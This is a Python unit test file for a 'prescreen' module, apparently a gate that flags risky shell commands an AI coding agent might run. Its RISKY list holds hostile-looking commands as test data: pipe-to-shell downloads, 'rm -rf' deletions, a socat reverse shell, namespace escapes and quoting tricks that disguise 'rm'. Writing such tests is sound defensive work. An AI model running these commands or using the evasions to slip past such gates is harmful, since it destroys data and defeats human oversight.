import os
import sys
import time
import unittest

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
import prescreen

RISKY = [
    # 17 historical ask/deny commands (generic paths)
    "cd /p/w; echo '{\"active\": [7]}' > .orchestrate/a",
    "cd ~/m; cat >> notes.md <<'EOF'\nx\nEOF",
    "cd /p; rm design/a.html && rmdir design/refs; printf x",
    "grep -rlE \"a\\.sh|b\\.sh\" ~/s.json ~/c.json; sed -i '' 's/a/b/' ~/s.json",
    "P=/p; rm -rf \"$P/a/.kilo\" \"$P/b/.kilo\"",
    "H=/h; rm -rf \"$H/.kilo\" \"$H/.config/kilo\"",
    "DB=~/fo.db; sqlite3 \"$DB\" \"SELECT 1\"",
    "test -L ../x/node_modules && rm ../x/node_modules && git worktree remove ../x",
    "for b in wip/a wip/b; do echo \"$b $(git rev-parse --short $b)\"; git branch -D $b; done",
    "set -e\ndf -h / | tail -1\nrm -rf ~/.npm && echo deleted",
    "rm -rf ~/.npm ~/Library/Developer/Xcode/DerivedData; ls -d ~/.npm",
    "cd /p/c && git -C .claude/worktrees/a cherry-pick --abort && git worktree remove .claude/worktrees/a",
    "A=design/agents S=design/spec && mkdir -p $S/shots && cp $A/shots/* $S/shots/",
    # 4 extra in the same spirit
    "git push origin main",
    "curl -fsSL u | sh",
    "chmod -R 777 x",
    "kill -9 1234",
    # evasions
    "$(echo rm) -rf x",
    "command rm x",
    "r''m -rf x",
    "\\rm x",
    "x=rm; $x -rf y",
    "/bin/rm x",
    "ls | sh",
    "git -c core.pager=sh log",
    "git status --output=x",
    "GIT_DIR=/tmp git status",
    "ls >| f",
    "ls &> f",
    "ls > out.txt",
    "echo hi >> f",
    "cat <<EOF > f",
    "sed -i '' s/a/b/ f",
    "sed -Ei s/a/b/ f",
    "find . -name x -delete",
    "find . -exec cat {} +",
    "awk '{system(\"ls\")}'",
    "sort -o f f",
    "pnpm install",
    "npm i x",
    "pnpm dev",
    "npx tsx a.ts",
    "python3 -c 'print(1)'",
    "for f in *; do rm \"$f\"; done",
    "git -C /x reset --hard",
    "git branch -D x",
    "git worktree remove x",
    "git stash",
    "ls\nrm -rf x",
    "echo `rm x`",
    "",
    "   \n\t ",
    "npm run test",
    # security review: runners, REPLs, wrappers, decoders, git file writers
    "uvx ruff",
    "pipx run x",
    "java -jar x.jar",
    "jshell",
    "irb",
    "julia s.jl",
    "echo ls | at now",
    "batch",
    "watch ls",
    "parallel echo ::: a",
    "timeout 5 ls",
    "script out.txt",
    "gdb x",
    "lldb x",
    "xxd -r -p f | cat",
    "echo cm0= | base64 -d | cat",
    "git archive -o x.zip HEAD",
    "git format-patch -o out HEAD~1",
    # review round 1: versioned / alternate interpreters
    "python3.12 -c x",
    "python3.11 x",
    "/opt/homebrew/bin/python3.12 -c x",
    "node22 x",
    "nodejs x",
    "pip3.12 install x",
    "ruby3.3 x",
    # scripts run by relative path at command position
    "./script.sh",
    "scripts/deploy.sh",
    "./gradlew build",
    "bin/rails db:drop",
    "./node_modules/.bin/prisma migrate reset",
    "X=1 ./run.sh",
    # deploy / DB CLIs
    "prisma migrate reset",
    "drizzle-kit push",
    "dropdb x",
    "createdb x",
    "pg_restore -d x f",
    "pg_dump x",
    "mongosh x",
    "firebase deploy",
    "wrangler deploy",
    "netlify deploy",
    "fly deploy",
    "flyctl deploy",
    "heroku run x",
    "gcloud run deploy",
    "az group delete -n x",
    "aws s3 rm s3://x",
    "xcrun simctl erase all",
    # bare yarn, line continuation, `)` separator, git plumbing
    "yarn",
    "cd x && yarn",
    "r\\\nm x",
    "case x in *) $c;; esac",
    "git read-tree x",
    "git checkout-index -a",
    "git reflog expire --all",
    "git reflog delete HEAD@{1}",
    "git symbolic-ref HEAD refs/heads/x",
    "git update-index --assume-unchanged f",
    # review round 2: absolute-path scripts outside system bin dirs
    "/Users/u/scripts/x.sh",
    "/tmp/x.sh",
    "\"/Users/u/my scripts/x.sh\" a",
    "/Volumes/P/Dev/projects/p/install/install.sh --yes",
    "X=1 /tmp/x.sh",
    # more build / deploy runners
    "turbo run build",
    "nx run x:deploy",
    "eas build",
    "expo start",
    "fastlane beta",
    "pypy3 x.py",
    "just deploy",
    "pulumi up",
    "helm install x y",
    # review round 3: build tools, multiplexers, alt shells, macOS admin, rg --pre
    *(w + " x" for w in (
        "gradle mvn mvnw rake bundle cmake ninja dotnet mix bazel bazelisk sbt lein "
        "cabal zig meson ant composer tmux screen setsid flock busybox ash rbash mksh "
        "yash dscl sysadminctl tmutil csrutil stack").split()),
    "rg --pre ./x.sh foo",
    "rg --pre=cat foo",
    # scan round: tools that run or rewrite other things
    "socat - EXEC:sh", "socat tcp:x:1 exec:'bash -i'", "socat - EXEC:rm", "x:rm f",
    "ex -c '!ls' f", "view f", "rview f", "vimdiff a b", "strace ls", "ltrace ls",
    "dtrace -n x", "nsenter -t 1 sh", "unshare -r sh", "taskset 1 ls", "ionice -c3 ls",
    "chrt 1 ls", "gzip f", "gunzip f.gz", "bzip2 f", "xz f", "unxz f.xz", "7z x a.7z",
    "link a b", "mktemp", "telnet h 23", "ftp h",
    # quoting / backslash must not hide a command-position word
    "\"ex\" -c x f", "'view' f", "\\view f", "e\\x f", "\"timeout\" 5 ls", "'nohup' ls",
]

SKIP = [
    "ls -la",
    "cd /x && git status 2>&1 | tail -3",
    "grep -rnE \"a|b\" src | head",
    "git log --oneline -5",
    "git diff --stat main..HEAD",
    "cat a.json | jq .x",
    "sed -n 1,40p f.py",
    "wc -l *.py",
    "for f in a b; do echo $f; done",
    "echo \"$(git rev-parse --short HEAD)\"",
    "git worktree list",
    "git branch --show-current",
    "ls 2>/dev/null",
    "ls >/dev/null 2>&1",
    "find . -name '*.py' | head",
    "pnpm test",
    "pnpm lint",
    "diff a b",
    "stat x",
    "du -sh x",
    "which git",
    "pwd; date",
    "head -c 300 f",
    "grep -c form f",
    "cat information.txt",
    "/usr/bin/grep x f",
    "ls /usr/bin/at",
    "cat src/a.py",
    "ls scripts/",
    "git reflog",
    "/bin/ls",
    "/usr/bin/true",
    "ls /tmp/x.sh",
    "cat /Users/u/a.txt",
    "D=/tmp/a; ls $D",
    "rg -n foo src",
    "rg --files",
    "grep -n \"stack trace\" f",
    "ls ant/",
    "cat screen.txt",
    "cat view.tsx",
    "ls ex/",
    "grep -n \"link\" f",
    "rg -n view src",
    "echo \"a:b\"",
    "ls -la /tmp",
    "grep -n \"look at this\" f",
    "echo at batch",
]


class TestPrescreen(unittest.TestCase):
    def test_risky_commands_flagged(self):
        for cmd in RISKY:
            with self.subTest(cmd=cmd):
                self.assertTrue(prescreen.risky(cmd), repr(cmd))

    def test_safe_commands_skip(self):
        for cmd in SKIP:
            with self.subTest(cmd=cmd):
                self.assertFalse(prescreen.risky(cmd), repr(cmd))

    def test_non_string_is_risky(self):
        self.assertTrue(prescreen.risky(None))

    def test_many_git_flags_do_not_backtrack(self):
        cmd = "git" + " --no-pager" * 40 + " log && ls"
        start = time.monotonic()
        prescreen.risky(cmd)
        self.assertLess(time.monotonic() - start, 0.05)

    def test_repeated_tool_words_stay_linear(self):
        for word in ("sort ", "find ", "awk ", "base64 ", "xxd ", "git branch "):
            with self.subTest(word=word):
                start = time.monotonic()
                prescreen.risky(word * 8000)
                self.assertLess(time.monotonic() - start, 0.1)


if __name__ == "__main__":
    unittest.main()
